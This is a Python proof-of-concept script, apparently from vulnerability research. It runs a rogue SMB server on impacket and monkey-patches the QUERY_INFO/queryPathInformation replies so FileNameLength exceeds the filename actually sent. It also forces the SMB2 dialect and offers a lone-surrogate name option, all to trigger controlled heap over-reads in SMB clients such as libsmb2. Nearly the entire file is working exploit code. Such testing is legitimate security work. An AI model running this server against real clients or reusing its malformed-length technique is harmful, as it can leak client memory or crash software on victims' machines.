#!/usr/bin/env python3
"""QUERY_INFO FileAllInformation reply with a controlled FileNameLength over-read.

usage: smbserv_qinfo2.py PORT UNITS DELTA
  name = 'A' * UNITS (2*UNITS bytes, no NUL halfwords)
  FileNameLength = 2*UNITS + 2*DELTA   (DELTA UTF-16 units past the buffer)
  OutputBufferLength = the real serialized payload length
"""
import os, sys
from impacket.smbserver import SimpleSMBServer, SMB2Commands

PORT = int(sys.argv[1]); UNITS = int(sys.argv[2]); DELTA = int(sys.argv[3])
SHARE = os.environ.get('SMB_SHARE', os.path.expanduser('~/smbshare'))
ORIG = SMB2Commands.smb2QueryInfo


def patched(connId, smbServer, recvPacket):
    res = ORIG(connId, smbServer, recvPacket)
    try:
        r0 = res[0] if res[0] is not None else res[1]
        cmd = r0[0] if isinstance(r0, (list, tuple)) else r0
        if 'Buffer' not in getattr(cmd, 'fields', {}) and 'Data' in getattr(cmd, 'fields', {}):
            cmd = cmd['Data']
        b = cmd['Buffer']
        if os.environ.get('SURROGATE'):
            name = b'A' * (2 * (UNITS - 1)) + b'\x00\xd8'   # U+D800 as UTF-16LE
        else:
            name = 'A' * UNITS
        b['NameInformation']['FileName'] = name
        b['NameInformation']['FileNameLength'] = 2 * UNITS + 2 * DELTA
        cmd['OutputBufferLength'] = len(b.getData())
        print('QINFO units=%d delta=%d buflen=%d fnlen=%d' %
              (UNITS, DELTA, cmd['OutputBufferLength'], b['NameInformation']['FileNameLength']), flush=True)
    except Exception as e:
        print('err', repr(e), flush=True)
    return res


SMB2Commands.smb2QueryInfo = staticmethod(patched)

# The client falls back to SMB1 on this impacket build, so the SMB2 patch alone
# never fires. queryPathInformation is the module-level builder both paths use;
# inflate FileNameLength there so the over-read happens on either dialect.
import impacket.smbserver as _S
from impacket.structure import Structure


class BadAllInfo(Structure):
    """SMBQueryFileAllInfo with FileNameLength no longer derived from FileName,
    so the declared length can exceed the bytes actually present."""
    structure = (
        ('CreationTime', '<q'), ('LastAccessTime', '<q'), ('LastWriteTime', '<q'),
        ('LastChangeTime', '<q'), ('ExtFileAttributes', '<L'), ('Reserved', '<L=0'),
        ('AllocationSize', '<q'), ('EndOfFile', '<q'), ('NumberOfLinks', '<L=0'),
        ('DeletePending', '<B=0'), ('Directory', '<B'), ('Reserved2', '<H=0'),
        ('EaSize', '<L=0'), ('FileNameLength', '<L'), ('FileName', ':'),
    )
_ORIG_QPI = _S.queryPathInformation


def patched_qpi(path, filename, level):
    print('QPI level=%d file=%r' % (level, filename), flush=True)
    rec, err = _ORIG_QPI(path, filename, level)
    try:
        if rec is not None and type(rec).__name__ == 'SMBQueryFileAllInfo':
            bad = BadAllInfo()
            for k in ('CreationTime', 'LastAccessTime', 'LastWriteTime', 'LastChangeTime',
                      'ExtFileAttributes', 'AllocationSize', 'EndOfFile', 'Directory'):
                bad[k] = rec[k]
            bad['FileName'] = rec['FileName']
            bad['FileNameLength'] = len(rec['FileName']) + 2 * DELTA
            print('QINFO-SMB1 fnlen=%d real=%d' % (bad['FileNameLength'], len(rec['FileName'])), flush=True)
            rec = bad
        elif rec is not None and 'FileNameLength' in getattr(rec, 'fields', {}):
            rec['FileNameLength'] = rec['FileNameLength'] + 2 * DELTA
            rec['FileName'] = rec['FileName'] + b'\x00' * (2 * DELTA)
            print('QINFO-SMB2 fnlen=%d' % rec['FileNameLength'], flush=True)
    except Exception as e:
        print('err', repr(e), flush=True)
    return rec, err


_S.queryPathInformation = patched_qpi

# libsmb2 opens with an SMB1 NEGOTIATE whose dialect list impacket does not
# recognise ("SMB2 not supported, fallbacking"), so the SMB2 path never runs.
# Add the dialect impacket wants before it looks.
_ORIG_NEG = SMB2Commands.smb2Negotiate


def patched_neg(connId, smbServer, recvPacket, isSMB1=False):
    try:
        if isSMB1:
            cmd = recvPacket['Data'][0]
            if b'SMB 2.002\x00' not in cmd['Data']:
                cmd['Data'] = cmd['Data'] + b'\x02SMB 2.002\x00'
    except Exception:
        pass
    return _ORIG_NEG(connId, smbServer, recvPacket, isSMB1)


SMB2Commands.smb2Negotiate = staticmethod(patched_neg)
srv = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=PORT)
srv.addShare('S', SHARE)
srv.setSMB2Support(True)
print('serving', flush=True)
srv.start()
